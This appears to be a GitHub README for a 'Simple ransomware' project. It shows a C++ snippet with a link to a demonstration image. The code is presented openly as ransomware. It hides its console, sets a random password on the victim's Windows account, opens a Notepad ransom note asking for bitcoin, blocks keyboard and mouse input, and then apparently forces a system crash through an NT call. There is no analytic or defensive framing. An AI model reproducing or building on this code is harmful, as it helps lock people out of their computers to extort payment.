##### Simple ransomware
<hr>

```cpp
string user_name = g_utils.get_user_name(); // getting user name

g_utils.rename_builder(); // renaming builder to random chars
g_win32.show_window(g_win32.get_console_window(), 0); // hide console
g_utils.set_password_windows(user_name, g_utils.random_string(25)); // setting random password of victim windows
g_utils.show_notepad(user_name, "your btc here"); // show readme using notepad.exe
g_win32.block_input(1); // blocking use mouse and keyboard
g_win32.sleeping_mode(10800000); // Sleep() in 3 hrs
g_nt.jmp_raise(19, ((DWORD)0xC00002B4L)); // call nt
```

##### Demostration
<hr>

![d](https://github.com/carterjwasd/notepad-ransomware/blob/main/demo.jpg)
